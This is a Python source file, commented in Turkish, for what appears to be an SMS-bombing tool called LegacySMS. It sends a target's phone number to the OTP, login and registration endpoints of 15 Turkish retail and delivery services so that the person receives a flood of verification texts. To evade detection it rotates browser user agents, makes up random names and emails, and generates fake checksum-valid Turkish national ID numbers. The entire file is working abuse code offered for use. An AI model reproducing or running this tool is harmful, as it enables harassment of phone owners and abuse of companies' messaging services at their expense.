import requests
from random import choice, randint
from string import ascii_lowercase, digits
from colorama import Fore, Style

#Bu Tool "https://github.com/s4m3dnotfound/LegacySMS" adresine aittir.

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0",
]

MAIL_DOMAINS = [
    "@gmail.com", "@outlook.com", "@hotmail.com", "@yahoo.com",
    "@protonmail.com", "@icloud.com", "@yandex.com", "@mail.com"
]


def _rand_mail():
    """Rastgele, çeşitli domain'lerde mail üretir."""
    length = randint(10, 20)
    name = ''.join(choice(ascii_lowercase + digits) for _ in range(length))
    return name + choice(MAIL_DOMAINS)


def _rand_name():
    """Rastgele isim döndürür."""
    isimler = ["Ahmet", "Mehmet", "Ali", "Veli", "Kemal", "Osman", "Yusuf", "Hasan", "Murat", "Emre"]
    soyisimler = ["Yilmaz", "Kaya", "Demir", "Sahin", "Celik", "Aydin", "Ozturk", "Arslan", "Dogan", "Kilic"]
    return choice(isimler), choice(soyisimler)


class SendSms:
    # ✅ FIX: adet artık instance-level, class-level değil
    def __init__(self, phone, mail):
        self.adet = 0  # Her instance'ın kendi sayacı

        # Geçerli T.C. kimlik no üret
        rakam = [randint(1, 9)]
        for _ in range(8):
            rakam.append(randint(0, 9))
        rakam.append(((rakam[0]+rakam[2]+rakam[4]+rakam[6]+rakam[8])*7 - (rakam[1]+rakam[3]+rakam[5]+rakam[7])) % 10)
        rakam.append(sum(rakam[:10]) % 10)
        self.tc = "".join(str(r) for r in rakam)

        self.phone = str(phone)
        self.mail = mail if (mail and "@" in mail) else _rand_mail()

    # --- Yardımcı metodlar (alt çizgi ile başlar, tarama dışında kalır) ---
    def _get_ua(self):
        return choice(USER_AGENTS)

    def _ok(self, name):
        print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> {name}")
        self.adet += 1

    def _err(self, name, msg):
        print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> {name} ({msg})")

    # ================================================================
    # ========================  SERVİSLER  ===========================
    # ================================================================

    # 1) Kahve Dünyası
    def KahveDunyasi(self):
        try:
            r = requests.post(
                "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json",
                         "X-Language-Id": "tr-TR", "X-Client-Platform": "web",
                         "Origin": "https://www.kahvedunyasi.com"},
                json={"countryCode": "90", "phoneNumber": self.phone},
                timeout=7
            )
            if r.status_code in (200, 201) and r.json().get("processStatus") == "Success":
                self._ok("KahveDünyası")
            else:
                self._err("KahveDünyası", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("KahveDünyası", type(e).__name__)

    # 2) BİM
    def Bim(self):
        try:
            r = requests.post(
                "https://bim.veesk.net/service/v1.0/account/login",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json",
                         "Origin": "https://www.bim.com.tr", "Referer": "https://www.bim.com.tr/"},
                json={"phone": self.phone},
                timeout=10
            )
            if r.status_code == 200:
                self._ok("BİM")
            else:
                self._err("BİM", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("BİM", type(e).__name__)

    # 3) FileMarket
    def File(self):
        try:
            r = requests.post(
                "https://api.filemarket.com.tr/v1/otp/send",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json",
                         "X-Os": "IOS", "X-Version": "1.7"},
                json={"mobilePhoneNumber": f"90{self.phone}"},
                timeout=7
            )
            if r.status_code in (200, 201) and r.json().get("responseType") == "SUCCESS":
                self._ok("FileMarket")
            else:
                self._err("FileMarket", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("FileMarket", type(e).__name__)

    # 4) Evidea
    def Evidea(self):
        try:
            boundary = "fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi"
            ad, soyad = _rand_name()
            data = (
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\n{ad}\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\n{soyad}\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\nAbc123!xyz\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n"
                f"--{boundary}--\r\n"
            )
            r = requests.post(
                "https://www.evidea.com/users/register/",
                headers={"User-Agent": self._get_ua(),
                         "Content-Type": f"multipart/form-data; boundary={boundary}",
                         "X-App-Type": "akinon-mobile", "X-App-Device": "ios"},
                data=data, timeout=7
            )
            if r.status_code == 202:
                self._ok("Evidea")
            else:
                self._err("Evidea", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("Evidea", type(e).__name__)

    # 5) Porty
    def Porty(self):
        try:
            r = requests.post(
                "https://panel.porty.tech/api.php",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json"},
                json={"job": "start_login", "phone": self.phone},
                timeout=10
            )
            if r.status_code == 200 and "success" in r.text.lower():
                self._ok("Porty")
            else:
                self._err("Porty", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("Porty", type(e).__name__)

    # 6) Domino's
    def Dominos(self):
        try:
            r = requests.post(
                "https://frontend.dominos.com.tr/api/customer/sendOtpCode",
                headers={"User-Agent": self._get_ua(),
                         "Content-Type": "application/json;charset=utf-8",
                         "Accept": "application/json, text/plain, */*",
                         "Servicetype": "CarryOut", "Locationcode": "undefined"},
                json={"email": self.mail, "isSure": False, "mobilePhone": self.phone},
                timeout=7
            )
            if r.status_code in (200, 201) and r.json().get("isSuccess"):
                self._ok("Dominos")
            else:
                self._err("Dominos", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("Dominos", type(e).__name__)

    # 7) Migros
    def Migros(self):
        try:
            r = requests.post(
                "https://www.migros.com.tr/rest/users/login/otp",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json",
                         "Origin": "https://www.migros.com.tr",
                         "Referer": "https://www.migros.com.tr/"},
                json={"phoneNumber": self.phone},
                timeout=7
            )
            if r.status_code == 200:
                self._ok("Migros")
            else:
                self._err("Migros", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("Migros", type(e).__name__)

    # 8) Getir
    def Getir(self):
        try:
            r = requests.post(
                "https://api.getir.com/client/login",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json",
                         "Language": "tr-TR"},
                json={"countryCode": "+90", "mobileNumber": self.phone},
                timeout=7
            )
            if r.status_code in (200, 201):
                self._ok("Getir")
            else:
                self._err("Getir", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("Getir", type(e).__name__)

    # 9) Trendyol
    def Trendyol(self):
        try:
            r = requests.post(
                "https://api.trendyol.com/authentication/v2/register/phone",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json",
                         "Origin": "https://www.trendyol.com",
                         "Referer": "https://www.trendyol.com/"},
                json={"gsmNumber": self.phone},
                timeout=7
            )
            if r.status_code in (200, 201):
                self._ok("Trendyol")
            else:
                self._err("Trendyol", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("Trendyol", type(e).__name__)

    # 10) Hepsiburada
    def Hepsiburada(self):
        try:
            r = requests.post(
                "https://giris.hepsiburada.com/api/registerByPhone",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json",
                         "Origin": "https://www.hepsiburada.com",
                         "Referer": "https://www.hepsiburada.com/"},
                json={"phoneNumber": f"0{self.phone}"},
                timeout=7
            )
            if r.status_code in (200, 201):
                self._ok("Hepsiburada")
            else:
                self._err("Hepsiburada", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("Hepsiburada", type(e).__name__)

    # 11) A101
    def A101(self):
        try:
            r = requests.post(
                "https://api.a101.com.tr/v1/auth/otp/send",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json",
                         "Origin": "https://www.a101.com.tr"},
                json={"phone": self.phone},
                timeout=7
            )
            if r.status_code in (200, 201):
                self._ok("A101")
            else:
                self._err("A101", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("A101", type(e).__name__)

    # 12) Flo
    def Flo(self):
        try:
            r = requests.post(
                "https://www.flo.com.tr/api/auth/otp-request",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json",
                         "Origin": "https://www.flo.com.tr",
                         "Referer": "https://www.flo.com.tr/giris"},
                json={"phoneNumber": self.phone},
                timeout=7
            )
            if r.status_code in (200, 201):
                self._ok("Flo")
            else:
                self._err("Flo", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("Flo", type(e).__name__)

    # 13) Mavi
    def Mavi(self):
        try:
            r = requests.post(
                "https://www.mavi.com/api/auth/sendOtp",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json",
                         "Origin": "https://www.mavi.com",
                         "Referer": "https://www.mavi.com/"},
                json={"phone": self.phone},
                timeout=7
            )
            if r.status_code in (200, 201):
                self._ok("Mavi")
            else:
                self._err("Mavi", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("Mavi", type(e).__name__)

    # 14) Gratis
    def Gratis(self):
        try:
            r = requests.post(
                "https://www.gratis.com/api/member/sendOtp",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json",
                         "Origin": "https://www.gratis.com",
                         "Referer": "https://www.gratis.com/"},
                json={"phone": self.phone},
                timeout=7
            )
            if r.status_code in (200, 201):
                self._ok("Gratis")
            else:
                self._err("Gratis", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("Gratis", type(e).__name__)

    # 15) Cepte İndirim
    def CepteIndirim(self):
        try:
            r = requests.post(
                "https://www.cepteindirim.com.tr/api/v1/auth/phone-login",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json"},
                json={"phone": f"90{self.phone}"},
                timeout=7
            )
            if r.status_code in (200, 201):
                self._ok("CepteIndirim")
            else:
                self._err("CepteIndirim", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("CepteIndirim", type(e).__name__)

#Bu Tool "https://github.com/s4m3dnotfound/LegacySMS" adresine aittir.
